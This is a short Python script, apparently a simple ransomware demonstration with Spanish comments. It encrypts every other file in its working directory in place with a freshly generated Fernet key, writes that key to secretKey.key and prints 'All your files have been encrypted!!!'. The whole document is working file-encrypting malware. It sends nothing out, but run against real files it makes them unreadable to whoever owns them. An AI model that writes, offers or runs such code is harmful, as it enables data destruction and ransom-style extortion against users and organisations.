#! /usr/bin/env python3

import os 
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file =="encrypt.py" or file =="secretKey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):  
		files.append(file)
print(files)


key = Fernet.generate_key()

with open("secretKey.key", "wb") as lallave:
	lallave.write(key)

#Encryptado
for file in files:
        with open(file,"rb") as theFile:
                content = theFile.read()
        contenido_encryptado = Fernet(key).encrypt(content)
        with open(file, "wb") as theFile:
                theFile.write(contenido_encryptado)

print("All your files have been encrypted!!!")
